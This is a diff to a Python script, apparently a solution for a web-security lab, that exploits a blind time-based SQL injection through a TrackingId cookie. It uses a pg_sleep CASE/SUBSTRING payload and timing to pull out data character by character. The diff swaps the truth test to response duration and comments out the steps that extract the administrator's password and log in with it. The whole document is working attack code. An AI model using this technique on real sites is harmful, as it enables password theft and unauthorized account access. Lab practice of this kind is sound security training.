@@ -37,10 +37,10 @@ class MySQLi(SQLi):
             f"select SUBSTRING(({inner_query}),1,1))=chr({char}))"
             " THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
-    def is_true(self, resp):
-        if resp.status_code == 200:
-            return False
-        return True
+    def is_true(self, resp, duration):
+        if duration > SLEEP:
+            return True
+        return False
     
     
     def format_request(self, url, outer_query):
@@ -65,15 +65,21 @@ def main(args):
     session_token = resp.cookies["session"]
     log.info(f"TrackingId: {tracking_id}")
     sqli = MySQLi(tracking_id, session_token)
-    password = sqli.get_response_string(
-        "SELECT password from users where username = 'administrator'",
-        shop.base_url,
-        shop.no_proxy,
-        10,
-    )
-    log.info(f"Received password: {password}")
-    shop.login("administrator", password)
-    shop.is_solved()
+    print(sqli.get_response_string("SELECT 'aaaa'", shop.base_url, shop.no_proxy, 1))
+   
+   
+   
+   
+   
+   #password = sqli.get_response_string(
+   #    "SELECT password from users where username = 'administrator'",
+   #    shop.base_url,
+   #    shop.no_proxy,
+   #    10,
+   #)
+   #log.info(f"Received password: {password}")
+   #shop.login("administrator", password)
+   #shop.is_solved()
     
 if __name__ == "__main__":
     args = utils.parse_args(sys.argv)
